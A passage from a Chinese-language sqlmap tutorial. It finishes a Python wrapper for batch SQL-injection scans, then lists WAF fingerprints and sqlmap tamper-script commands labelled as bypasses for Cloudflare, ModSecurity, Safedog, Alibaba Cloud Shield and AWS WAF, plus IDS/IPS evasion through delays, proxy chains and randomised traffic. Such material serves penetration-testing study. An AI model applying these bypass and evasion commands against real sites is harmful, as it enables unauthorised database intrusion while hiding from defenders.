<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">                cmd.append(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'--</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">key</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">value</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 执行命令</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        try</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">            result </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> subprocess.run(</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">                cmd,</span></span>
<span data-line><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">                capture_output</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">True</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span data-line><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">                text</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">True</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span data-line><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">                timeout</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">300</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">            )</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">            </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">                'success'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: result.returncode </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">==</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">                'output'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: result.stdout,</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">                'error'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: result.stderr</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">            }</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        except</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> subprocess.TimeoutExpired:</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">                'success'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">False</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">                'output'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">''</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">                'error'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'扫描超时'</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">            }</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> batch_scan</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(self, urls, </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">**</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">options):</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        &quot;&quot;&quot;批量扫描&quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        results </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> []</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        for</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> url </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">in</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> urls:</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">            print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;正在扫描: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">url</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">            result </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.scan(url, </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">**</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">options)</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">            results.append({</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">                'url'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: url,</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">                'result'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: result</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">            })</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> results</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用示例</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">if</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> __name__</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> ==</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '__main__'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    wrapper </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> SQLMapWrapper()</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 单个扫描</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    result </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> wrapper.scan(</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        'http://example.com/page.php?id=1'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span data-line><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">        dbs</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">True</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span data-line><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">        random_agent</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">True</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    )</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(result[</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'output'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">])</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 批量扫描</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    urls </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        'http://example1.com/page.php?id=1'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        'http://example2.com/product.php?pid=2'</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    ]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    results </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> wrapper.batch_scan(urls, </span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">batch</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">True</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">random_agent</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">True</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    for</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> item </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">in</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> results:</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\n{</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'='</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">50}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;URL: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">item[</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'url'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;结果: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">item[</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'result'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">][</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'success'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span></code></pre></figure>
<h3 id="112-防护与对抗">11.2 防护与对抗<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#112-防护与对抗" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<h4 id="waf识别与绕过">WAF识别与绕过<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#waf识别与绕过" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<h5 id="waf指纹识别">WAF指纹识别<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#waf指纹识别" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 识别WAF类型</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --identify-waf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 常见WAF特征</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Cloudflare: HTTP头包含 &quot;CF-RAY&quot;</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 阿里云盾: HTTP头包含 &quot;Ali-CDN-Real-IP&quot;</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安全狗: 返回内容包含 &quot;safedog&quot;</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ModSecurity: 响应码 406, 501</span></span></code></pre></figure>
<h5 id="针对性绕过方案">针对性绕过方案<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#针对性绕过方案" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 1. Cloudflare绕过</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --tamper=space2comment</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --random-agent</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --delay=2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --technique=T</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 2. ModSecurity绕过</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --tamper=modsecurityversioned,space2hash</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --random-agent</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 3. 安全狗绕过</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --tamper=space2morehash,between,randomcase</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --random-agent</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --hpp</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 4. 阿里云盾绕过</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --tamper=space2comment,between</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --random-agent</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --delay=3</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --safe-url=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://example.com/&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --safe-freq=2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 5. AWS WAF绕过</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --tamper=space2comment,charencode</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --random-agent</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --delay=2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 6. 自定义WAF规则绕过</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 分析WAF拦截规则</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 构造针对性Tamper脚本</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用多层编码混淆</span></span></code></pre></figure>
<h4 id="ipsids对抗">IPS/IDS对抗<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#ipsids对抗" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 1. 降低扫描频率</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--delay</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">5</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --timeout</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">30</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 2. 使用代理链</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--proxy-file</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">proxies.txt</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 3. 分散测试时间</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用cron定时执行，避免集中测试</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 4. 混淆流量特征</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--random-agent</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--randomize=id </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--hpp</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 5. 使用加密通道</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--force-ssl</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 6. 避免敏感关键字</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--tamper</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">randomcase,space2comment</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 7. 完整对抗方案</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --proxy=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://proxy:8080&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --random-agent</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --delay=5</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --tamper=space2comment,randomcase</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --safe-url=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://example.com/&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --safe-freq=3</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --hpp</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
